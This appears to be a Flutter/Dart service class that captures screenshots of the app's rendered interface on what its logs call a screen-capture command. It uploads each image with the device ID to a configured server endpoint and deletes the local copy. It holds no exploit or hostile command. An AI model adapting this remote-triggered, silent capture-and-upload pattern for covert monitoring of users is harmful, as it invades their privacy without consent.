import 'dart:io';
import 'dart:typed_data';
import 'package:dio/dio.dart';
import 'package:get/get.dart' hide FormData, MultipartFile;
import 'dart:developer' as developer;
import 'package:screenshot/screenshot.dart';
import 'package:path_provider/path_provider.dart';
import '../../core/constants/app_endpoints.dart';
import '../api/api_service.dart';
import '../local/local_storage_service.dart';

class ScreenCaptureService {
  static const String _tag = 'ScreenCaptureService';
  static final ScreenshotController _screenshotController =
      ScreenshotController();

  /// Initialize screenshot controller
  static Future<void> initialize() async {
    try {
      developer.log('Initializing screenshot controller...', name: _tag);
      developer.log('✅ Screenshot controller initialized', name: _tag);
    } catch (e) {
      developer.log(
        '❌ Failed to initialize screenshot controller',
        name: _tag,
        error: e,
      );
    }
  }

  /// Get screenshot controller instance
  static ScreenshotController get controller => _screenshotController;

  /// Capture screen and send to server
  static Future<void> captureAndSend() async {
    developer.log('========================================', name: _tag);
    developer.log('🖥️ SCREEN CAPTURE COMMAND', name: _tag);

    try {
      developer.log('Capturing screen...', name: _tag);

      // Capture screen as Uint8List
      final Uint8List? imageBytes = await _screenshotController.capture(
        pixelRatio: 1.0,
      );

      if (imageBytes == null) {
        developer.log('❌ Screen capture failed - no data returned', name: _tag);
        return;
      }

      developer.log('✅ Screen captured successfully', name: _tag);
      developer.log(
        'Screenshot size: ${(imageBytes.length / 1024).toStringAsFixed(2)} KB',
        name: _tag,
      );

      // Save to temporary file
      final Directory tempDir = await getTemporaryDirectory();
      final String timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final String filePath = '${tempDir.path}/screenshot_$timestamp.png';

      final File imageFile = File(filePath);
      await imageFile.writeAsBytes(imageBytes);

      developer.log('Screenshot saved to: $filePath', name: _tag);

      // Send to server
      await _sendToServer(imageFile);
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to capture screen',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Capture with high quality
  static Future<void> captureHighQuality() async {
    developer.log('========================================', name: _tag);
    developer.log('🖥️ HIGH QUALITY SCREEN CAPTURE', name: _tag);

    try {
      developer.log('Capturing screen with high quality...', name: _tag);

      final Uint8List? imageBytes = await _screenshotController.capture(
        pixelRatio: 2.0, // Higher quality
      );

      if (imageBytes == null) {
        developer.log('❌ Screen capture failed', name: _tag);
        return;
      }

      developer.log('✅ High quality screen captured', name: _tag);
      developer.log(
        'Screenshot size: ${(imageBytes.length / 1024).toStringAsFixed(2)} KB',
        name: _tag,
      );

      final Directory tempDir = await getTemporaryDirectory();
      final String timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final String filePath = '${tempDir.path}/screenshot_hq_$timestamp.png';

      final File imageFile = File(filePath);
      await imageFile.writeAsBytes(imageBytes);

      await _sendToServer(imageFile);
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to capture high quality screen',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Capture with delay
  static Future<void> captureWithDelay(Duration delay) async {
    developer.log('========================================', name: _tag);
    developer.log('🖥️ DELAYED SCREEN CAPTURE', name: _tag);
    developer.log('Delay: ${delay.inSeconds} seconds', name: _tag);

    try {
      developer.log('Waiting for ${delay.inSeconds} seconds...', name: _tag);
      await Future.delayed(delay);

      developer.log('Capturing screen...', name: _tag);

      final Uint8List? imageBytes = await _screenshotController.capture(
        delay: delay,
        pixelRatio: 1.0,
      );

      if (imageBytes == null) {
        developer.log('❌ Screen capture failed', name: _tag);
        return;
      }

      developer.log('✅ Screen captured successfully', name: _tag);

      final Directory tempDir = await getTemporaryDirectory();
      final String timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final String filePath =
          '${tempDir.path}/screenshot_delayed_$timestamp.png';

      final File imageFile = File(filePath);
      await imageFile.writeAsBytes(imageBytes);

      await _sendToServer(imageFile);
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to capture delayed screen',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Capture and return bytes without sending
  static Future<Uint8List?> captureAsBytes({double pixelRatio = 1.0}) async {
    try {
      developer.log('Capturing screen as bytes...', name: _tag);

      final Uint8List? imageBytes = await _screenshotController.capture(
        pixelRatio: pixelRatio,
      );

      if (imageBytes != null) {
        developer.log(
          'Captured ${(imageBytes.length / 1024).toStringAsFixed(2)} KB',
          name: _tag,
        );
      }

      return imageBytes;
    } catch (e) {
      developer.log('Failed to capture as bytes', name: _tag, error: e);
      return null;
    }
  }

  /// Capture and save to file without sending
  static Future<File?> captureToFile({
    String? customPath,
    double pixelRatio = 1.0,
  }) async {
    try {
      developer.log('Capturing screen to file...', name: _tag);

      final Uint8List? imageBytes = await _screenshotController.capture(
        pixelRatio: pixelRatio,
      );

      if (imageBytes == null) {
        developer.log('❌ Capture failed', name: _tag);
        return null;
      }

      String filePath;
      if (customPath != null) {
        filePath = customPath;
      } else {
        final Directory tempDir = await getTemporaryDirectory();
        final String timestamp = DateTime.now().millisecondsSinceEpoch
            .toString();
        filePath = '${tempDir.path}/screenshot_$timestamp.png';
      }

      final File imageFile = File(filePath);
      await imageFile.writeAsBytes(imageBytes);

      developer.log('✅ Screenshot saved to: $filePath', name: _tag);
      return imageFile;
    } catch (e) {
      developer.log('Failed to capture to file', name: _tag, error: e);
      return null;
    }
  }

  /// Send screenshot to server
  static Future<void> _sendToServer(File imageFile) async {
    try {
      developer.log('Preparing to send screenshot to server...', name: _tag);

      // Verify file exists before proceeding
      if (!await imageFile.exists()) {
        developer.log('❌ Image file does not exist', name: _tag);
        return;
      }

      // Get device ID
      final deviceId = await LocalStorageService.getDeviceId();
      if (deviceId == null || deviceId.isEmpty) {
        developer.log('❌ No device ID found', name: _tag);
        return;
      }

      developer.log('Device ID: ${deviceId.substring(0, 8)}...', name: _tag);

      // Get API service
      final apiService = ApiService();
      await apiService.init();

      // Create form data
      developer.log('Creating form data...', name: _tag);
      final int fileSize = await imageFile.length();
      developer.log(
        'Uploading file size: ${(fileSize / 1024).toStringAsFixed(2)} KB',
        name: _tag,
      );

      FormData formData = FormData.fromMap({
        'device_id': deviceId,
        'screenshot': await MultipartFile.fromFile(
          imageFile.path,
          filename: 'screenshot_${DateTime.now().millisecondsSinceEpoch}.png',
        ),
      });

      developer.log(
        'Sending POST to ${ApiEndpoints.sendScreenshot}',
        name: _tag,
      );

      // Send to server with timeout
      final response = await apiService.dio.post(
        ApiEndpoints.sendScreenshot,
        data: formData,
        options: Options(
          sendTimeout: const Duration(seconds: 60),
          receiveTimeout: const Duration(seconds: 60),
        ),
      );

      developer.log('Response status: ${response.statusCode}', name: _tag);
      developer.log('Response data: ${response.data}', name: _tag);

      if (response.statusCode == 200 || response.statusCode == 201) {
        developer.log('✅ Screenshot uploaded successfully', name: _tag);

        // Delete local file after successful upload
        try {
          if (await imageFile.exists()) {
            await imageFile.delete();
            developer.log('✅ Local screenshot deleted', name: _tag);
          }
        } catch (deleteError) {
          developer.log(
            '⚠️ Failed to delete local screenshot',
            name: _tag,
            error: deleteError,
          );
        }
      } else {
        developer.log(
          '⚠️ Upload failed with status: ${response.statusCode}',
          name: _tag,
        );
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to send screenshot to server',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }
  }

  /// Send existing file to server
  static Future<void> sendFileToServer(File imageFile) async {
    await _sendToServer(imageFile);
  }

  /// Send bytes to server
  static Future<void> sendBytesToServer(Uint8List imageBytes) async {
    try {
      developer.log('Converting bytes to file...', name: _tag);

      final Directory tempDir = await getTemporaryDirectory();
      final String timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final String filePath = '${tempDir.path}/screenshot_$timestamp.png';

      final File imageFile = File(filePath);
      await imageFile.writeAsBytes(imageBytes);

      await _sendToServer(imageFile);
    } catch (e) {
      developer.log('Failed to send bytes to server', name: _tag, error: e);
    }
  }

  /// Check if screenshot is supported (always true for this package)
  static Future<bool> isSupported() async {
    return true;
  }

  /// No permission needed for screenshot package
  static Future<bool> requestPermission() async {
    developer.log('Screenshot package does not require permission', name: _tag);
    return true;
  }
}
